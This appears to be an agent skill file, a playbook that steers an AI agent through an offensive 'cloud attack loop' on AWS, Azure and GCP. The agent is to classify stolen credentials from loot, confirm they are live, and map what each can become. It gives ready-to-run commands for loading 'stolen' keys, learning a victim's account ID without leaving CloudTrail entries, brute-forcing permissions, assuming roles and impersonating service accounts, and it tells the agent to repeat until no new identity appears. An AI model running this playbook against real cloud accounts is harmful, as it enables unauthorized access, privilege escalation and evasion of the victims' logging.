---
name: cloud-credential-enumeration
description: Discover, classify, validate, and identity-map cloud credentials (AWS keys, Azure service principals/JWTs/SAS, GCP service-account keys and tokens), then enumerate what each credential can become; use whenever any credential material is found or re-found — this is the entry and re-entry hub of the cloud attack loop.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Cloud Credential Enumeration

Every cloud operation starts (and restarts) here. Whenever ANY credential material
surfaces — in a repo, a config file, an instance metadata response, a CI log, a
storage bucket, process memory — run it through this loop:

1. **Recognize** — classify the material (provider, type, format).
2. **Validate** — confirm it is live and establish WHO it is (lowest-noise call first).
3. **Map** — enumerate what the identity CAN DO and CAN BECOME (roles, assignments,
   impersonation targets).
4. **Route** — hand the identity to the right sibling skill; any NEW credential
   produced downstream re-enters at step 1.

Deep per-provider detail: `references/providers.md`. rupu wiring: `references/rupu.md`.

## 1. Recognize credential material

| Provider | Material | Looks like / lives at |
|---|---|---|
| AWS | Long-term access key | `AKIA[0-9A-Z]{16}` + 40-char secret |
| AWS | Temporary (STS) key | `ASIA[0-9A-Z]{16}` + secret + session token (long base64, `AWS_SESSION_TOKEN`) |
| AWS | Profile files | `~/.aws/credentials`, `~/.aws/config` (profiles, `role_arn`, `source_profile`, SSO config) |
| AWS | Environment | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` |
| Azure | Service principal | tenant ID + appId (client ID) + client secret or certificate; JSON from `az ad sp create-for-rbac` |
| Azure | JWT bearer token | `eyJ...` — decode payload; `aud` = `https://management.azure.com/` (ARM) or `https://graph.microsoft.com/` (Graph); claims `oid`, `tid`, `upn`, `roles` |
| Azure | SAS token/URL | query string `?sv=...&ss=...&srt=...&sp=...&sig=...` (account SAS) or `?sv=...&sr=...&sp=...&sig=...` (service SAS) |
| Azure | CLI cache | `~/.azure/azureProfile.json` (subscriptions + tenants), `~/.azure/msal_token_cache.json` (refresh/access tokens), `~/.azure/service_principal_entries.json` |
| GCP | Service-account key | JSON with `"type": "service_account"`, `client_email`, `private_key` |
| GCP | OAuth access token | `ya29.` prefix (user/SA access token, ~1h lifetime) |
| GCP | gcloud state | `~/.config/gcloud/credentials.db` (sqlite, refresh tokens), `access_tokens.db`, `application_default_credentials.json` (ADC — user refresh token or SA key) |

Run the classifier over any blob, file, or directory:

```
python3 scripts/classify_credentials.py --input /path/to/loot-dir -o out/work-units.json --assets out/assets.json
```

It regex-matches all of the above, decodes JWT claims (base64url, no verification),
parses service-account JSON, and emits one work unit per credential plus an assets
list of principals. **Output: `out/work-units.json`** (bare JSON array — rupu-ingestible).

## 2. Validate and establish identity (lowest noise first)

### AWS
```bash
# Account ID WITHOUT touching the victim account's CloudTrail — logs in YOUR account:
aws sts get-access-key-info --access-key-id AKIAEXAMPLE000000000
# Full identity (logs sts:GetCallerIdentity in the victim's CloudTrail, but it is
# un-deniable by IAM policy and extremely common/noisy-blind):
aws sts get-caller-identity          # -> Account, Arn, UserId
```
Load found keys as a profile first: `aws configure --profile stolen` (or export the
three env vars; ASIA keys REQUIRE the session token). The ARN tells you user vs
assumed-role vs federated; an assumed-role ARN reveals the role name to look up.

### Azure
```bash
# Offline first — decode the JWT, zero network traffic:
#   aud (which API), tid (tenant), oid (principal object id), upn/appid, roles/wids
az account show                      # current context: tenant, subscription, user type
az ad signed-in-user show            # Graph identity (user creds only)
az login --service-principal -u <appId> -p <secret> --tenant <tid>   # SP secret
az rest --method GET --url https://graph.microsoft.com/v1.0/me       # raw Graph with a bearer token
```
A raw bearer token can be used without `az login`:
`curl -s -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2022-12-01"`.

### GCP
```bash
gcloud auth activate-service-account --key-file=sa.json
gcloud auth list                                   # which identities are loaded
gcloud projects list                               # projects visible to the identity
# ya29. token — validate offline-ish via Google tokeninfo (hits Google, not the project):
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=ya29...."   # -> email, scope, expires_in
```

Automate across all three providers and record identities as assets:

```
python3 scripts/whoami_all.py --aws-profiles stolen,default --azure --gcp -o out/identities.json --work-units out/whoami-units.json
```

## 3. Map what the credential CAN BECOME

### AWS — roles, trust policies, assume-role
```bash
aws iam list-roles --query 'Roles[].{R:RoleName,T:AssumeRolePolicyDocument}' --output json
aws iam get-role --role-name Admin                 # read one trust policy
aws iam list-attached-user-policies --user-name X && aws iam list-user-policies --user-name X
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name s
```
Trust policies whose `Principal` includes your account/user/role = pivot now.
Route to **cloud-privilege-escalation** / **pmapper** (`pmapper graph create` →
`pmapper query 'preset privesc *'`) for the full who-can-become-whom graph, and to
**pacu** for exploitation modules.

**IAM read denied?** Brute-force effective permissions with enumerate-iam:
`python3 enumerate_iam.py --access-key AKIA... --secret-key ... [--session-token ...]`
— it calls hundreds of read-only APIs and reports which succeed. Very noisy in
CloudTrail; accept that or cherry-pick calls manually.

### Azure — role assignments + Entra directory roles
```bash
az role assignment list --assignee <oid> --all --include-inherited --output json
az role assignment list --all --output json        # everything you can read
# Entra (directory) roles via Graph:
az rest --method GET --url 'https://graph.microsoft.com/v1.0/me/memberOf'
az rest --method GET --url 'https://graph.microsoft.com/v1.0/servicePrincipals/<oid>/memberOf'
```
Watch for `Owner`, `User Access Administrator`, `Contributor`, Key Vault roles, and
Entra roles like Application Administrator / Privileged Role Administrator.
Route tenant-level work to **azure-entra-id**; subscription privesc to
**cloud-privilege-escalation**. If role reads are denied, probe by doing: attempt
reads against each resource type (`az vm list`, `az keyvault list`,
`az storage account list`) and infer assignments from what succeeds.

### GCP — IAM policy, impersonation, testIamPermissions
```bash
gcloud projects get-iam-policy PROJECT_ID --format=json
gcloud iam service-accounts list --project PROJECT_ID
# Can I mint tokens as a more privileged SA?
gcloud auth print-access-token --impersonate-service-account=admin@PROJECT_ID.iam.gserviceaccount.com
# Permission brute force when get-iam-policy is denied (works with ONLY a token):
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H 'Content-Type: application/json' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
  -d '{"permissions":["resourcemanager.projects.setIamPolicy","iam.serviceAccountKeys.create","iam.serviceAccounts.getAccessToken"]}'
```
`iam.serviceAccounts.getAccessToken` / `.signBlob` / `.implicitDelegation` on any SA,
or `iam.serviceAccountKeys.create`, are direct become-that-SA paths. Any success
re-enters this skill at step 1 with the new token.

## 4. Route (hand off by name)

| Goal | Skill |
|---|---|
| Posture / misconfig sweep of the whole account | **prowler**, **scoutsuite** |
| Attack-surface + resource enumeration | **cloudfox**, **aws-enumeration**, **azure-enumeration**, **gcp-enumeration** |
| Privilege-escalation graph + exploitation | **pmapper**, **pacu**, **cloud-privilege-escalation** |
| Entra ID / tenant attacks | **azure-entra-id** |
| Storage buckets found during mapping | **cloud-storage-exposure** |
| Secrets in loot/configs | **trufflehog** |
| Umbrella / orchestration | **cloud-security** |

Record every principal with `assets.mark`, every confirmed exposure (leaked live key,
over-privileged trust policy, impersonation path) with `findings.report`, and emit
work units for each new credential — see `references/rupu.md`. **Every credential a
downstream skill produces comes back here. The loop only ends when no new identity
appears.**
